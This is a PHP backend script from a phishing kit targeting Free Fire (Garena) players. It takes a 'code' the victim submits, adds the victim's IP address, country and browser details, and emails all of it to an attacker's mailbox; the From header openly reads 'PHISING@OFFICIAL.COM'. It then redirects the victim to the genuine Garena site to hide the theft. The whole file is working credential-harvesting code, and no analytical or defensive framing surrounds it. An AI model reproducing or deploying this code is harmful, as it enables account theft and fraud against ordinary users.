<?php
error_reporting(0);
include('cilepeung.php');

$code= $_POST['code'];



$message   = "

====[ KODE NYA PULU]====

• 	KODE PULU PULU : ".$code."


Pulu Pulu Pulu Pulu

====[ INFO DEVICE ]====

• IP Info   :  ".$alamat."  ".$nama_negro." On ".gmdate('r')."
• Browser   :  ".$_SERVER['HTTP_USER_AGENT']." 

  ====[ THE END ]====
======[  DONE   ]=======

";

include 'emailku.php';
$subject = "setorff16@gmail.com";
$headers = "From: •DOCLO TABLO• <PHISING@OFFICIAL.COM>";
mail($emailku, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));


$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));
?>
<!DOCTYPE html>
<html>
  <html>
<head>
<meta http-equiv="REFRESH" content="0;url=https://ff.garena.com/">
</head>
<body>
</body>
</html>


